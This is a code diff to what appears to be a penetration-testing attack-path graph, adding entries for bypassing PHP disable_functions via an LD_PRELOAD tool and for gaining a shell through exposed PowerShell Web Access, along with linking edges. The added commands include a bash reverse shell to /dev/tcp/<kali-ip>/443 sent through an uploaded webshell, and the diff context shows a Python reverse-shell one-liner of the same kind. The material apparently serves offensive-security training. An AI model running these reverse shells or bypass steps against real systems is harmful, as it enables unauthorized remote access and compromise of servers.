@@ -342,6 +342,43 @@ import os; os.system('bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"')`,
             ],
             tags: ['werkzeug', 'flask', 'debug', 'pin', 'rce'],
         },
+        {
+            id: 'php-disable-functions',
+            title: 'PHP disable_functions bypass',
+            type: 'technique',
+            phase: 'web',
+            os: 'linux',
+            description:
+                'The webshell runs but system()/exec() are in disable_functions. Bypass it by preloading a shared object that re-enables exec, then run a normal reverse shell.',
+            commands: [
+                {
+                    label: 'php_ld_preloader.py',
+                    code: `# on Kali (search "php_ld_preloader.py" on GitHub):
+python3 php_ld_preloader.py -u http://<target>/sh.php -c 'id'
+# then upgrade to a reverse shell:
+python3 php_ld_preloader.py -u http://<target>/sh.php -c 'bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"'`,
+                },
+            ],
+            tags: ['php', 'disable_functions', 'preload', 'ld_preload'],
+        },
+        {
+            id: 'pswa',
+            title: 'PowerShell Web Access',
+            type: 'finding',
+            phase: 'web',
+            os: 'windows',
+            description:
+                'PowerShell Web Access exposes a browser-based PowerShell console at /launch (usually port 443). Log in with domain creds for an instant interactive shell - no listener needed.',
+            commands: [
+                {
+                    label: 'Discover + use',
+                    code: `gobuster dir -u https://<target> -w /usr/share/seclists/Discovery/Web-Content/common.txt   # look for /launch /pswa
+# browse to https://<target>/launch and log in with domain creds
+# the browser console runs PowerShell -> whoami, then run tools`,
+                },
+            ],
+            tags: ['pswa', 'powershell-web-access', 'launch', '443'],
+        },
     ],
     edges: [
         { from: 'web-dirbust', to: 'login-form-found', label: '/admin, login page' },
@@ -374,6 +411,11 @@ import os; os.system('bash -c "bash -i >& /dev/tcp/<kali-ip>/443 0>&1"')`,
         { from: 'webdav', to: 'webshell-upload', label: 'PUT + MOVE webshell' },
         { from: 'lfi', to: 'werkzeug-debugger-pin', label: 'Flask debug console exposed' },
         { from: 'werkzeug-debugger-pin', to: 'foothold-linux', label: 'PIN console -> RCE' },
+        { from: 'webshell-upload', to: 'php-disable-functions', label: 'system() blocked by disable_functions' },
+        { from: 'php-disable-functions', to: 'foothold-linux', label: 'preload .so -> shell' },
+        { from: 'web-dirbust', to: 'pswa', label: '/launch (PowerShell Web Access)' },
+        { from: 'pswa', to: 'foothold-windows', label: 'login with domain creds' },
+
         { from: 'login-form-found', to: 'creds-found', label: 'default/weak creds work' },
     ],
 }
